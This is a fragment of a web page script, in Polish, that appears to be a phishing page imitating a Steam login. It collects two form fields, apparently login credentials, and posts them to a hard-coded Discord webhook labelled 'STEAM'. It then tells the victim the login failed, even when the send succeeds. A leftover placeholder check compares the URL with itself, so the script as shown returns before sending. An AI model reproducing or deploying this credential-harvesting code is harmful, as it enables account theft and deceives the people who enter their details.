                        autocomplete="off"

                        id="remember"
                        type="checkbox"

    <script>

        const WEBHOOK_URL =
            "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP";


        const form =
            document.getElementById("form");

        const pole1 =
            document.getElementById("pole1");

        const pole2 =
            document.getElementById("pole2");

        const status =
            document.getElementById("status");

        const submitButton =
            document.getElementById("submitButton");


        form.addEventListener(
            "submit",
            async function(event) {

                event.preventDefault();

                const value1 =
                    pole1.value.trim();

                const value2 =
                    pole2.value.trim();


                if (!value1 || !value2) {

                    status.textContent =
                        "Uzupełnij oba pola.";

                    status.style.color =
                        "#d66b6b";

                    return;
                }


                if (
                    !WEBHOOK_URL ||
                    WEBHOOK_URL ===
                    "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP"
                ) {

                    status.textContent =
                        "Czekaj";

                    status.style.color =
                        "#d66b6b";

                    return;
                }


                submitButton.disabled = true;

                status.textContent =
                    "Wysyłanie...";

                status.style.color =
                    "#8f98a5";


                const data = {

                    username: "STEAM",

                    embeds: [
                        {
                            title:
                                "Nowe zgłoszenie",

                            fields: [
                                {
                                    name: "Pole 1",
                                    value:
                                        value1.substring(
                                            0,
                                            1024
                                        ),
                                    inline: false
                                },

                                {
                                    name: "Pole 2",
                                    value:
                                        value2.substring(
                                            0,
                                            1024
                                        ),
                                    inline: false
                                }
                            ],

                            color: 6730740,

                            timestamp:
                                new Date()
                                    .toISOString()
                        }
                    ]
                };


                try {

                    const response =
                        await fetch(
                            WEBHOOK_URL,
                            {
                                method: "POST",

                                headers: {
                                    "Content-Type":
                                        "application/json"
                                },

                                body:
                                    JSON.stringify(data)
                            }
                        );


                    if (!response.ok) {
                        throw new Error(
                            "HTTP " +
                            response.status
                        );
                    }


                    status.textContent =
                        "Zalogowanie nie powiodło się";

                    status.style.color =
                        "#66c0f4";


                    pole1.value = "";
                    pole2.value = "";


                } catch (error) {

                    console.error(error);

                    status.textContent =
                        "Zalogowanie nie powiodło się";

                    status.style.color =
                        "#d66b6b";

                } finally {

                    submitButton.disabled =
                        false;

                }

            }
        );

    </script>
